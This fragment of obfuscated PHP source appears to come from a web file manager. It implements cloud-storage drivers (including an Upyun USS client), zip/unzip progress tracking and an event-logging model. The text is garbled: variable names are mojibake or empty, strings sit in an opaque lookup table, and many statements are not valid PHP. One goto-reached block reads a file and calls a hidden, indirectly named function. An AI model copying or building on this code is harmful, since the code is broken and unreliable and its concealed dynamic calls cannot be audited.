$›•[1470] => $[$›•[1470]]); } public function link($Œô, $Ïüä = array()) { return parent::link($Œô, $Ïüä); } public function fileOut($Àí, $ = false, $‡§© = false, $ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[][1478])) { return parent::fileOutServer($Àí, $, $‡§©, $); } parent::fileOut($Àí, $, $‡§©, $); } public function fileOutImage($≈ù, $‹° = 250) { if (strstr($this->endpoint, $_SERVER[][1478])) { return parent::fileOutImageServer($≈ù, $‹°); } parent::fileOutImage($≈ù, $‹°); } public function fileOutLink($…ø) { $ =& $_SERVER[]; if (substr($…ø, 0, 7) == $[1371]) { $…ø = $[1372] . substr($…ø, 7); } header($[172] . $…ø); die; } public function getHost() { $ Ø =& $_SERVER[]; $–ò = str_rtrim(parent::getHost(), $ Ø[18] . $this->bucket); $–ò = explode($ Ø[208], $–ò); return $–ò[0] . $ Ø[208] . $this->bucket . $ Ø[20] . $–ò[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($, $Œπ = 0) { parent::__construct(); $this->source = $; $this->sourceSize = $Œπ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ = false) { return $this->sourceSize; } public function getContent($∆´ = false) { return $this->fileSubstr($∆´, 0, $this->sourceSize); } public function fileSubstr($Ãá = false, $Ê°∑ = 0, $‡º¨ = 0) { if (!$‡º¨) { $‡º¨ = $this->sourceSize; } $ = $this->sourceSize - $Ê°∑; if ($‡º¨ >= $) { $‡º¨ = $; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Ê°∑, $‡º¨); } if ($this->sourceType == self::TYPE_FILE) { if ($‡º¨ <= 0) { return $_SERVER[][22]; } $€¶Â¨ã = ftell($this->source); fseek_64($this->source, $€¶Â¨ã + $Ê°∑); $ = @fread($this->source, $‡º¨); fseek_64($this->source, $€¶Â¨ã); return $; } } public function hashMd5($◊ô = false) { return md5($this->getContent()); } public static function hash($€∞, $ = 0) { $ ¨ = new PathDriverStream($€∞, $); return $ ¨->hashSimple($€∞); } public static function md5($, $ = 0) { $ = new PathDriverStream($, $); return $->hashMd5($); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\160\72\x2f\57\166\60\56\x61\x70\x69\x2e\x75\x70\171\x75\x6e\x2e\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($›ö) { parent::__construct(); $this->_init($›ö); } public function _init($) { $‘∏ =& $_SERVER[]; foreach ($ as $π∑ó => $Ã®) { if (isset($this->{$π∑ó})) { $this->{$π∑ó} = $Ã®; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($‘∏[1479] . LNG($‘∏[1410])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($‹ï, $Ã∑ = "\107\x45\x54") { $ =& $_SERVER[]; $ = gmdate($[1443]); $Œ™ = base64_encode(hash_hmac($[1480], "{$Ã∑}\46{$‹ï}\x26{$}", md5("{$this->userpass}"), !0)); $È¥ã = array("\x41\165\x74\x68\x6f\x72\151\172\141\x74\151\x6f\x6e\x3a\x55\120\x59\x55\x4e\x20{$this->username}\72{$Œ™}", "\x44\141\x74\x65\72{$}"); return $È¥ã; } public function ussRequest($—èŒò, $ = "\x47\105\124", $ = false, $⁄™ = false, $∆û = false) { $ =& $_SERVER[]; $—èŒò = trim($—èŒò, $[18]); $Ÿ´ = "\57{$this->bucket}\x2f{$—èŒò}"; $“™ = $this->ussHeaders($Ÿ´, $); if ($⁄™) { $“™ = array_merge($“™, $⁄™); } $Ÿî = url_request($this->endpoint . $Ÿ´, $, $, $“™, $∆û); if (!$Ÿî) { return array($[1253] => !1, $[1243] => $[1481]); } if (strtolower($) == $[221] || in_array($Ÿî[$[1253]], array($[266], $[1482]))) { $ = $Ÿî[$[1483]]; } else { $ = json_decode($Ÿî[$[1243]], !0); if (!$) { $ = $Ÿî[$[1243]]; } else { if (!$Ÿî[$[790]] && isset($[$[1484]])) { $ = $[$[1484]]; } } } return array($[1253] => $Ÿî[$[790]], $[1243] => $); } public function mkfile($÷Ø‚Å∂, $ÿ©Ÿò = '', $ = REPEAT_RENAME) { if ($this->setContent($÷Ø‚Å∂, $ÿ©Ÿò)) { return $this->getPathOuter($÷Ø‚Å∂); } return !1; } public function mkdir($, $Õë = REPEAT_SKIP) { $Èé†”Ω =& $_SERVER[]; $Ÿ≥ = trim($, $Èé†”Ω[18]); if ($this->_isFolder($Ÿ≥)) { return $this->getPathOuter($Ÿ≥); } $ = array($Èé†”Ω[1485]); $…† = $this->ussRequest($Ÿ≥, $Èé†”Ω[251], !1, $); return $…†[$Èé†”Ω[1253]] ? $this->getPathOuter($Ÿ≥) : !1; } public function copyFile($¬è, $·ëµ) { $”£ =& $_SERVER[]; $◊ª = array($”£[1486] . "\57{$this->bucket}\x2f{$¬è}", $”£[1487]); $ = $this->ussRequest($·ëµ, $”£[253], !1, $◊ª); return $[$”£[1253]] ? !0 : $this->getPathOuter($·ëµ); } public function moveFile($, $) { $Èúè‹ù =& $_SERVER[]; $ÀÉ = array($Èúè‹ù[1488] . "\x2f{$this->bucket}\x2f{$}", $Èúè‹ù[1487]); $‚Ç¢ = $this->ussRequest($, $Èúè‹ù[253], !1, $ÀÉ); return $‚Ç¢[$Èúè‹ù[1253]] ? !0 : $this->getPathOuter($); } public function delFile($) { $ =& $_SERVER[]; $Ã∞ = $this->ussRequest($, $[1489]); return $Ã∞[$[1253]] ? !0 : !1; } public function delFolder($) { $Œû =& $_SERVER[]; if (!$this->exist($)) { return !0; } $this->listItemCache = !1; $·ãÆ = $¬Ω = array(); $this->fileList($, $·ãÆ, $¬Ω, !0); $this->listItemCache = !0; foreach ($¬Ω as $”£) { $ = $this->ussRequest($”£[$Œû[42]], $Œû[1489]); if (!$[$Œû[1253]]) { return !1; } } foreach ($·ãÆ as $) { $ = $this->ussRequest($, $Œû[1489]); if (!$[$Œû[1253]]) { return !1; } } $ = $this->ussRequest($, $Œû[1489]); return $[$Œû[1253]]; } public function rename($, $) { if ($this->isFile($)) { $ = get_path_father($) . $; return $this->moveFile($, $); } return $this->renameObject($, $); } public function fileInfo($Ã¨, $ = false, $ = array()) { $ﬁî =& $_SERVER[]; $›ö = array($ﬁî[42] => $this->pathThis($Ã¨), $ﬁî[94] => $this->getPathOuter($ﬁî[18] . $Ã¨), $ﬁî[43] => $ﬁî[224], $ﬁî[86] => isset($[$ﬁî[86]]) ? $[$ﬁî[86]] : 0, $ﬁî[185] => $this->ext($Ã¨)); if ($) { return $›ö; } $›ö[$ﬁî[225]] = $›ö[$ﬁî[95]] = 0; $›ö[$ﬁî[226]] = $›ö[$ﬁî[227]] = !0; if (empty($)) { $ = $this->objectMeta($Ã¨); if (!$) { return $›ö; } } $›ö[$ﬁî[225]] = intval($[$ﬁî[1490]]); $›ö[$ﬁî[95]] = intval($[$ﬁî[1491]]); $›ö[$ﬁî[86]] = $[$ﬁî[86]]; return $›ö; } public function folderInfo($, $‹û = false) { $…é‘î =& $_SERVER[]; $Ëå° = array($…é‘î[42] => $this->pathThis($), $…é‘î[94] => $this->getPathOuter($…é‘î[18] . $), $…é‘î[43] => $…é‘î[85]); if ($‹û) { return $Ëå°; } $Ëå°[$…é‘î[225]] = $Ëå°[$…é‘î[95]] = 0; $Ëå°[$…é‘î[226]] = $Ëå°[$…é‘î[227]] = !0; if (empty($·óµ)) { $·óµ = $this->objectMeta($); if (!$·óµ) { return $Ëå°; } } $Ëå°[$…é‘î[225]] = intval($·óµ[$…é‘î[1490]]); $Ëå°[$…é‘î[95]] = intval($·óµ[$…é‘î[1491]]); return $Ëå°; } private function listObjs($Œ∞, $Âπ≤ = 0, $ = 1000) { $Ãù =& $_SERVER[]; $ÓØ• = array($Ãù[1492], $Ãù[1493] . $); if ($Âπ≤) { $ÓØ•[] = $Ãù[1494] . $Âπ≤; } $·†ê«≤ = $this->ussRequest($Œ∞, $Ãù[255], !1, $ÓØ•); return !$·†ê«≤[$Ãù[1253]] ? !1 : $·†ê«≤[$Ãù[1243]]; } private function fileList($Àî, &$¬ä«©, &$€µ, $ = false) { $‘û =& $_SERVER[]; $ = $‘û[22]; $»à = 1000; $ﬂê = rtrim($Àî, $‘û[18]) . $‘û[18]; while (!0) { check_abort(); $⁄± = $this->listObjs($Àî, $, $»à); if (!$⁄±) { return !1; } $ = isset($⁄±[$‘û[1495]]) ? $⁄±[$‘û[1495]] : $‘û[22]; $Îµó = isset($⁄±[$‘û[1496]]) ? $⁄±[$‘û[1496]] : array(); foreach ($Îµó as $ﬁ´) { $Ë¥ê = $ﬁ´[$‘û[43]] == $‘û[85] ? !0 : !1; $ = ltrim($ﬂê . $ﬁ´[$‘û[42]], $‘û[18]) . ($Ë¥ê ? $‘û[18] : $‘û[22]); $ = array($‘û[42] => $, $‘û[43] => $Ë¥ê ? $‘û[85] : $‘û[224], $‘û[86] => $ﬁ´[$‘û[390]], $‘û[1491] => $ﬁ´[$‘û[1497]]); $this->cacheMethodInfoSet($, $Ë¥ê, $); if ($Ë¥ê) { $¬ä«©[] = $; if ($) { $this->fileList($, $¬ä«©, $€µ, $); } continue; } $€µ[] = $; } if (count($Îµó) < $»à) { break; } } $this->cacheMethodInfoSet($Àî, !0); } public function listPath($Êïó, $ = false) { $ =& $_SERVER[]; $÷Ω = $ å = array(); $this->fileList($Êïó, $÷Ω, $ å); foreach ($÷Ω as $€ª => $) { $÷Ω[$€ª] = $this->folderInfo($, $); } foreach ($ å as $€ª => $) { $ å[$€ª] = $this->fileInfo($[$[42]], $, $); } return array($[92] => $÷Ω, $[93] => $ å); } public function has($, $’ù = false, $Œ†ÿá = true) { $Ÿç =& $_SERVER[]; $ŸÑ = $Ÿç[22]; $‹ï = 500; $÷õ = 0; $Î®© = 0; $œ∫ = rtrim($, $Ÿç[18]) . $Ÿç[18]; while (!0) { check_abort(); $◊ª◊ª = $this->listObjs($, $ŸÑ, $‹ï); if (!$◊ª◊ª) { return !1; } $ŸÑ = isset($◊ª◊ª[$Ÿç[1495]]) ? $◊ª◊ª[$Ÿç[1495]] : $Ÿç[22]; $∆´€°⁄≤ = isset($◊ª◊ª[$Ÿç[1496]]) ? $◊ª◊ª[$Ÿç[1496]] : array(); if (empty($∆´€°⁄≤)) { break; } $Ÿ† = array_filter($∆´€°⁄≤, function ($) { $ =& $_SERVER[]; return $[$[43]] == $[85]; }); $›£ = count($∆´€°⁄≤); $Ÿ† = count($Ÿ†); $ﬁ® = $›£ - $Ÿ†; if ($’ù) { $Î®© += $Ÿ†; $÷õ += $ﬁ®; if ($›£ < $‹ï) { break; } continue; } if ($Œ†ÿá) { if ($ﬁ®) { return !0; } } else { if ($Ÿ†) { return !0; } } if ($›£ < $‹ï) { break; } } if ($’ù) { return array($Ÿç[233] => $÷õ, $Ÿç[234] => $Î®©); } return !1; } public function listAll($€á‹æ) { $ =& $_SERVER[]; $¬Ä = $‘® = array(); $this->fileList($€á‹æ, $¬Ä, $‘®, !0); $ ± = array_to_keyvalue($‘®, $[42]); foreach ($¬Ä as $ﬁ∏) { if (is_string($ﬁ∏)) { $ ±[$ﬁ∏] = array($[86] => 0); } } return $this->listAllFiles($€á‹æ, $ ±); } public function canRead($) { return $this->exist($) ? !0 : !1; } public function canWrite($–£) { return $this->exist($–£) ? !0 : !1; } public function getContent($∆É) { return $this->fileSubstr($∆É, 0, -1); } public function setContent($”Æ, $’¥ = '') { $÷õ =& $_SERVER[]; if (!$’¥) { $«ï = $this->ussRequest($”Æ, $÷õ[251]); return $«ï[$÷õ[1253]]; } $ = $this->tempFile($this->pathThis($”Æ)); file_put_contents($, $’¥); if ($this->upload($”Æ, $)) { $this->tempFileRemve($); return !0; } return !1; } public function fileSubstr($”•, $Œ¢, $”ß) { $…ô =& $_SERVER[]; if (!($‚™ô = $this->link($”•))) { return !1; } $Íêø = !1; if ($”ß > 0) { $ = $Œ¢ + $”ß - 1; $Íêø = array($…ô[1458] . $Œ¢ . $…ô[439] . $); } $ÿ§ = url_request($‚™ô, $…ô[255], !1, $Íêø); return $ÿ§[$…ô[790]] ? $ÿ§[$…ô[1243]] : !1; } public function upload($, $, $◊õ = false, $»© = REPEAT_REPLACE) { $ÕÇ =& $_SERVER[]; $“ä = IO::size($); if ($“ä <= 1024 * 1024 * 200) { $ = array($ÕÇ[1498] . $); $ = $this->ussRequest($, $ÕÇ[253], $); return $[$ÕÇ[1253]] ? $this->getPathOuter($) : !1; } $ = 1024 * 1024 * 10; $¬ùﬂ´ = array($ÕÇ[1499], $ÕÇ[1500] . $“ä, $ÕÇ[1501], $ÕÇ[1502] . $); $ = $this->ussRequest($, $ÕÇ[253], !1, $¬ùﬂ´); if (!$[$ÕÇ[1253]]) { return !1; } $’ù—ú = $[$ÕÇ[1243]]; $ = 0; $Ÿµ = $’ù—ú[$ÕÇ[1503]]; $ = fopen($, $ÕÇ[1407]); if (!$) { return !1; } do { $Ï≠° = $’ù—ú[$ÕÇ[1504]]; fseek_64($, $); $ = fread($, $Ï≠°); $ = 0; do { $++; $’ù—ú = $this->uploadPart($, $’ù—ú, $); } while (!$’ù—ú && $ < 3); if (!$’ù—ú) { return !1; } $Ÿµ = $’ù—ú[$ÕÇ[1503]]; $ += $Ï≠°; } while ($Ÿµ != -1); fclose($); $¬ùﬂ´ = array($ÕÇ[1505], $ÕÇ[1506] . $’ù—ú[$ÕÇ[1507]], $ÕÇ[1501]); $ = $this->ussRequest($, $ÕÇ[253], !1, $¬ùﬂ´); return $[$ÕÇ[1253]] ? $this->getPathOuter($) : !1; } private function uploadPart($ÈâÖ, $ﬂ†, &$÷¢) { $ﬁá =& $_SERVER[]; $√§ = array($ﬁá[1508], $ﬁá[1506] . $ﬂ†[$ﬁá[1507]], $ﬁá[1509] . $ﬂ†[$ﬁá[1503]], $ﬁá[153] . $ﬂ†[$ﬁá[1504]]); $œÜ∆ù = $this->ussRequest($ÈâÖ, $ﬁá[253], $÷¢, $√§); return !$œÜ∆ù[$ﬁá[1253]] ? $œÜ∆ù[$ﬁá[1253]] : $œÜ∆ù[$ﬁá[1243]]; } public function uploadFormData($›û, $ = 3600) { return $this->uploadPolicy($›û, $); } public function multiUploadFormData($, $ = 3600) { $”§ƒ± =& $_SERVER[]; $÷Ç = (int) $GLOBALS[$”§ƒ±[17]][$”§ƒ±[86]]; return $this->uploadPolicy($, $, $÷Ç); } private function uploadPolicy($ÿ∑, $ = 3600, $⁄â = 0) { $ =& $_SERVER[]; $”∑ = $[18] . $this->bucket; $Êπº = gmdate($[1443]); $ = array($[1510] => $this->bucket, $[1511] => $ÿ∑, $[1512] => time() + $, $[1513] => $Êπº); if ($⁄â) { $[$[1424]] = $⁄â; } $ = base64_encode(json_encode($)); $√Ç = base64_encode(hash_hmac($[1480], "\120\x4f\x53\124\x26{$”∑}\46{$Êπº}\x26{$}", md5("{$this->userpass}"), !0)); $»¨ = array($[285] => $, $[1514] => "\125\x50\x59\125\116\x20{$this->username}\72{$√Ç}", $[206] => $this->endpoint . $”∑); return $»¨; } public function download($ÿñ, $—æ) { $Œñ = IO::getPathInner(IO::mkfile($—æ)); if (!($…Ü√Å = $this->link($ÿñ))) { return !1; } $ = 0; $»û = 1024 * 200; $ = fopen($Œñ, $_SERVER[][1464]); while (!0) { $ = $this->fileSubstr($ÿñ, $, $»û); if ($ === !1) { return !1; } fwrite($, $); $ += $»û; if (strlen($) < $»û) { break; } } fclose($); return $—æ; } public function link($, $ = array()) { $Ùè∂ç =& $_SERVER[]; $ = trim($, $Ùè∂ç[18]); if (!empty($this->token)) { $ = strtotime(date($Ùè∂ç[1515])); $‹£ = substr(md5($this->token . $Ùè∂ç[337] . $ . $Ùè∂ç[1516] . $), 12, 8) . $; $[] = $Ùè∂ç[1517] . $‹£; } $ = !empty($) ? $Ùè∂ç[83] . implode($Ùè∂ç[337], $) : $Ùè∂ç[22]; return $this->getHost() . $Ùè∂ç[18] . $ . $; } public function fileOut($…¥, $Œ≤ = false, $–∫ = false, $—∏¬ä = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($…¥, $Œ≤, $–∫, $—∏¬ä); } if (!$–∫) { $–∫ = $this->pathThis($…¥); } $…É = $Œ≤ ? array($_SERVER[][1518] . rawurlencode($–∫)) : array(); $ = $this->link($…¥, $…É); $this->fileOutLink($); } public function fileOutServer($√Å◊Å, $ ∫ = false, $–± = false, $√¶ = '') { parent::fileOut($√Å◊Å, $ ∫, $–±, $√¶); } public function fileOutImage($›Ä, $ = 250) { $€ç = $this->link($›Ä . $_SERVER[][1519] . $); $this->fileOutLink($€ç); } public function fileOutImageServer($…ú∆ª, $ﬂÇ = 250) { parent::fileOutImage($…ú∆ª, $ﬂÇ); } public function hashMd5($…ß) { $ =& $_SERVER[]; $‰Äô = $this->_objectMeta($…ß); return isset($‰Äô[$[238]]) ? $‰Äô[$[238]] : !1; } public function size($‘ó) { $ﬁá = $this->objectMeta($‘ó); return $ﬁá ? $ﬁá[$_SERVER[][86]] : 0; } public function info($) { if ($this->isFolder($)) { return $this->folderInfo($); } else { if ($this->isFile($)) { return $this->fileInfo($); } } return !1; } public function exist($Œç) { return $this->isFile($Œç) || $this->isFolder($Œç); } public function isFile($) { return !$this->isFolder($) && $this->objectMeta($); } public function isFolder($Ïïö) { return $this->cacheMethod($_SERVER[][176], $Ïïö); } protected function objectMeta($ÔùÜ) { return $this->cacheMethod($_SERVER[][178], $ÔùÜ); } protected function _objectMeta($·®§) { $ =& $_SERVER[]; if ($·®§ == $[22] || $·®§ == $[18]) { return array(); } $÷µ = $this->ussRequest($·®§, $[1520]); if (!$÷µ[$[1253]]) { return null; } $Ÿç = isset($÷µ[$[1243]]) ? $÷µ[$[1243]] : array(); if (!isset($Ÿç[$[1521]])) { return null; } $ = array($[43] => isset($Ÿç[$[1521]]) ? $Ÿç[$[1521]] : null, $[86] => isset($Ÿç[$[1522]]) ? $Ÿç[$[1522]] : null, $[238] => isset($Ÿç[$[1523]]) ? $Ÿç[$[1523]] : null, $[1490] => isset($Ÿç[$[1524]]) ? $Ÿç[$[1524]] : null); $[$[1491]] = isset($Ÿç[$[1525]]) ? strtotime($Ÿç[$[1525]]) : $[$[1490]]; return $; } protected function _isFolder($) { $ =& $_SERVER[]; if ($ == $[22] || $ == $[18]) { return !0; } $ÂØæ = $this->_objectMeta($); return isset($ÂØæ[$[43]]) && $ÂØæ[$[43]] == $[85] ? !0 : !1; } } goto cÍ∑ë; Aÿô: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Ôºù, $ = 5.0) { if (!$Ôºù) { return; } $ÁìÖ = Cache::get($Ôºù); if (!$ÁìÖ || timeFloat() - floatVal($ÁìÖ) >= $) { Cache::set($Ôºù, timeFloat(), $ * 10); return !0; } return !1; } public static function timeLimitCall($·à¥, $’¨, $Õ©, $Õó = 5.0) { $ =& $_SERVER[]; if (!$·à¥ || !$’¨) { return; } self::$asyncAdd = !0; $ = $[1791]; $◊é = Cache::get($, !0); $ = array($[1792] => timeFloat(), $[1793] => timeFloat(), $[317] => $’¨, $[1783] => $Õ©, $[204] => $Õó); if (is_array($◊é[$·à¥])) { $[$[1793]] = $◊é[$·à¥][$[1793]]; } if (is_array($◊é[$·à¥])) { if (timeFloat() - $◊é[$·à¥][$[1792]] < $[$[204]] * 0.3) { return; } $[$[1793]] = $◊é[$·à¥][$[1793]]; } $◊é[$·à¥] = $; Cache::set($, $◊é, 60); Cache::removeMemory($); write_log($[1794] . $·à¥ . $[81] . $’¨, $[195]); } public static function timeLimitCallLoop() { $ =& $_SERVER[]; $üÉø = array($[1795]); $«í = in_array(strtolower(ACTION), $üÉø); if (!$«í && !self::$asyncAdd) { return; } $«Ç = $[1791]; $ = Cache::get($«Ç, !0); if (!$ || count($) <= 0) { return; } $ÊóÆ = !1; $√º = timeFloat(); $≈ù = array(); foreach ($ as $—ë => $) { if ($√º - $[$[1793]] > $[$[204]]) { $ÊóÆ = !0; try { Hook::apply($[$[317]], $[$[1783]]); write_log($[1796] . $—ë . $[81] . $[$[317]] . $[1797] . ACTION, $[195]); } catch (Exception $) { } continue; } $≈ù[$—ë] = $; } if (!$ÊóÆ) { return; } if (!$≈ù) { return Cache::remove($«Ç); } Cache::set($«Ç, $≈ù, 60); Cache::removeMemory($«Ç); } public static function finished($, $Âµ†) { $≈ì =& $_SERVER[]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($≈ì[317] => $, $≈ì[1783] => $Âµ†); } private static function finishedRun() { $ =& $_SERVER[]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Áùè) { try { Hook::apply($Áùè[$[317]], $Áùè[$[1783]]); } catch (Exception $√®) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $√á =& $_SERVER[]; parent::startAfter(); Hook::bind($√á[1798], array($this, $√á[1799])); Hook::bind($√á[1234], array($this, $√á[1800])); Hook::bind($√á[1801], array($this, $√á[1802])); $–î =& $this->task; $–î[$√á[1803]] = $√á[1235]; if (!$–î[$√á[1582]]) { $–î[$√á[1582]] = LNG($√á[1804]); } } protected function endAfter() { $ =& $_SERVER[]; parent::endAfter(); Hook::unbind($[1798], array($this, $[1799])); Hook::unbind($[1234], array($this, $[1800])); Hook::unbind($[1801], array($this, $[1802])); } public function updateAfter() { $«ê∆ú =& $_SERVER[]; $ =& $this->task; if (!$[$«ê∆ú[826]] || !$[$«ê∆ú[803]]) { if ($[$«ê∆ú[1803]] != $«ê∆ú[366]) { return; } } if ($[$«ê∆ú[1803]] == $«ê∆ú[1235]) { $ § = 0; if ($[$«ê∆ú[1738]]) { $ § = $[$«ê∆ú[1739]] / $[$«ê∆ú[1738]]; } $[$«ê∆ú[1687]] = $ § * 0.3; } else { if ($[$«ê∆ú[1803]] == $«ê∆ú[366]) { $ § = $[$«ê∆ú[1686]] / $[$«ê∆ú[826]]; $[$«ê∆ú[1687]] = 0.3 + $ § * 0.4; } else { if ($[$«ê∆ú[1803]] == $«ê∆ú[117]) { $ = 0; if ($[$«ê∆ú[1740]] == $«ê∆ú[117]) { $ = $[$«ê∆ú[1739]]; } $ § = ($[$«ê∆ú[1743]] + $) / $[$«ê∆ú[803]]; $[$«ê∆ú[1687]] = 0.3 + 0.4 + $ § * 0.3; } } } if ($[$«ê∆ú[1687]] > 0) { $ = timeFloat() - $[$«ê∆ú[1689]] - $[$«ê∆ú[1692]]; $[$«ê∆ú[1693]] = $ * (1 - $[$«ê∆ú[1687]]) / $[$«ê∆ú[1687]]; } } public function addFile($’®›ó) { $ π∆í =& $_SERVER[]; $ =& $this->task; $ = IO::info($’®›ó); $[$ π∆í[1736]] = $[$ π∆í[42]]; $[$ π∆í[1738]] = $[$ π∆í[86]]; $[$ π∆í[1739]] = 0; $[$ π∆í[1105]] = $ π∆í[1759]; $[$ π∆í[1740]] = $ π∆í[1235]; $[$ π∆í[803]] = $[$ π∆í[86]]; $[$ π∆í[826]] = 1; $ÿ≥ = 0; $[$ π∆í[1747]] = array($ π∆í[1748] => $ÿ≥ + 1, $ π∆í[471] => $[$ π∆í[42]], $ π∆í[94] => $[$ π∆í[94]], $ π∆í[560] => $[$ π∆í[560]] ? $[$ π∆í[560]] : $[$ π∆í[94]]); $this->update(); } public function zipEvent($Àè, $‰∏∏»≥, $»ß, $„≤í) { $ =& $_SERVER[]; $Ã™ =& $this->task; $Ã™[$[1736]] = get_path_this($‰∏∏»≥); $Ã™[$[1738]] = $„≤í; $Ã™[$[1739]] = $»ß; $Ã™[$[1105]] = $Àè == $[1805] ? $[1806] : $[1807]; $Ã™[$[1740]] = $[22]; $Ã™[$[803]] = $„≤í; $Ã™[$[1803]] = $[366]; $this->update(); } public function unzipAfter($›â) { $–π =& $_SERVER[]; $‰ò° =& $this->task; $‰ò°[$–π[1803]] = $–π[117]; $Õ•›í = IO::infoWithChildren($›â); $Îìá = 0; $‰ò°[$–π[1747]] = array($–π[1748] => $Îìá + 1, $–π[471] => $Õ•›í[$–π[42]], $–π[94] => $Õ•›í[$–π[94]], $–π[560] => $Õ•›í[$–π[560]] ? $Õ•›í[$–π[560]] : $Õ•›í[$–π[94]]); if ($Õ•›í[$–π[43]] == $–π[224]) { $‰ò°[$–π[826]] = 1; } else { $‰ò°[$–π[826]] = $Õ•›í[$–π[89]][$–π[87]]; } $‰ò°[$–π[1105]] = $–π[22]; $‰ò°[$–π[1740]] = 0; $‰ò°[$–π[1686]] = 0; $‰ò°[$–π[1738]] = 0; $‰ò°[$–π[1739]] = 0; $‰ò°[$–π[1736]] = $–π[22]; $‰ò°[$–π[1743]] = 0; $‰ò°[$–π[803]] = $Õ•›í[$–π[86]]; $this->update(); self::log($–π[1808] . json_encode(array($‰ò°, $Õ•›í))); } public function nameParse($) { $ =& $_SERVER[]; $ ± =& $this->task; if ($ ±[$[1803]] == $[1235]) { $ ±[$[1803]] = $[366]; $ ±[$[1743]] = 0; $ ±[$[803]] = 0; } $ÀÄ = get_path_this($); if (strstr($ÀÄ, $[20])) { $ ±[$[1686]] += 1; $ ±[$[826]] += 1; } $ ±[$[1736]] = $; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ =& $_SERVER[]; parent::startAfter(); Hook::bind($[1809], array($this, $[1799])); Hook::bind($[1801], array($this, $[1802])); $ÿ£ =& $this->task; $ÿ£[$[1803]] = $[1235]; if (!$ÿ£[$[1582]]) { $ÿ£[$[1582]] = LNG($[1810]); } } protected function endAfter() { $œ∏ =& $_SERVER[]; parent::endAfter(); Hook::unbind($œ∏[1809], array($this, $œ∏[1799])); Hook::unbind($œ∏[1801], array($this, $œ∏[1802])); } public function updateAfter() { $‹´ =& $_SERVER[]; $ =& $this->task; if (!$[$‹´[826]] || !$[$‹´[803]]) { return; } if ($[$‹´[1803]] == $‹´[1235]) { $€Å = $[$‹´[1739]]; if ($[$‹´[1740]] != $‹´[1235]) { $€Å = 0; } $Œ© = ($[$‹´[1743]] + $€Å) / $[$‹´[803]]; $[$‹´[1687]] = $Œ© * 0.3; } else { if ($[$‹´[1803]] == $‹´[366]) { $Œ© = $[$‹´[1686]] / $[$‹´[826]]; $[$‹´[1687]] = 0.3 + $Œ© * 0.5; } else { if ($[$‹´[1803]] == $‹´[117]) { $Œ© = 0; if ($[$‹´[1738]]) { $Œ© = $[$‹´[1739]] / $[$‹´[1738]]; } $[$‹´[1687]] = 0.3 + 0.5 + $Œ© * 0.2; } } } if ($[$‹´[1687]] > 0) { $–ß = timeFloat() - $[$‹´[1689]] - $[$‹´[1692]]; $[$‹´[1693]] = $–ß * (1 - $[$‹´[1687]]) / $[$‹´[1687]]; } } public function copyFileStart($—ö, $, $·âß, $»ê, $, $) { $Œõ =& $_SERVER[]; parent::copyFileStart($—ö, $, $·âß, $»ê, $, $); $ =& $this->task; if ($[$Œõ[1803]] == $Œõ[366]) { $[$Œõ[1803]] = $Œõ[117]; } $this->update(); } public function copyFileEnd($€ò, $, $, $ÙÑêÄ, $ÈõØ, $”Æ) { $ =& $_SERVER[]; $ =& $this->task; $[$[1739]] = $[$[1738]]; $[$[1743]] += $[$[1738]]; $[$[1740]] = $[22]; $this->update(); } public function zipEvent($ÿ¶Àª, $Í∫•, $≈¨, $€¥) { $›≥ =& $_SERVER[]; $’¥ =& $this->task; $’¥[$›≥[1736]] = get_path_this($Í∫•); $’¥[$›≥[1738]] = $€¥; $’¥[$›≥[1739]] = $≈¨; $’¥[$›≥[1105]] = $ÿ¶Àª == $›≥[1811] ? $›≥[1806] : $›≥[1807]; $’¥[$›≥[1740]] = $›≥[22]; $’¥[$›≥[803]] = $€¥; $’¥[$›≥[1803]] = $›≥[366]; $this->update(); } public function nameParse($) { $‘â =& $_SERVER[]; $ =& $this->task; if ($[$‘â[1686]] < $[$‘â[826]]) { $ = get_path_this($); if (strstr($, $‘â[20])) { $[$‘â[1686]] += 1; } } if ($[$‘â[1803]] == $‘â[1235]) { $[$‘â[1803]] = $‘â[366]; } $[$‘â[1736]] = $; $this->update(); } } goto d; a: if ($_SERVER[$_SERVER[][6]] != $_SERVER[$_SERVER[][7]]) { $_getc = $_SERVER[][8]; $_getfile = $_SERVER[$_SERVER[][9]] . $_SERVER[][10]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[][11], $_getfilec); if (count($_getarrs) < $_SERVER[][12]) { $exit = $_SERVER[][13]; $exit(); } $_act = $_SERVER[][14]; $_act($_SERVER[$_SERVER[][15]]); } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\x75\162\x63\x65\x5f\x65\166\x65\x6e\164"; protected $dataAuto = array(array("\x63\162\145\x61\164\x65\124\151\x6d\145", "\164\x69\x6d\x65", "\x69\x6e\x73\145\x72\164", "\x66\165\x6e\143\164\x69\157\x6e"), array("\144\x65\163\143", '', "\151\x6e\x73\x65\x72\164\54\165\160\144\141\164\145\54\x73\145\154\145\143\x74", "\152\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($…Å, $—ò, $Œµ = '') { $ =& $_SERVER[]; if (!$this->eventSave) { return; } $ = Model($[1373])->sourceInfo($…Å); if (!$) { return !1; } if ($this->isCacheEvent($, $—ò)) { return; } if ($Œµ && is_string($Œµ)) { $Œµ = array($[1922] => $Œµ); } $ = defined($[2104]) ? USER_ID : 0; $Ó∞É = array($[468] => $…Å, $[2105] => 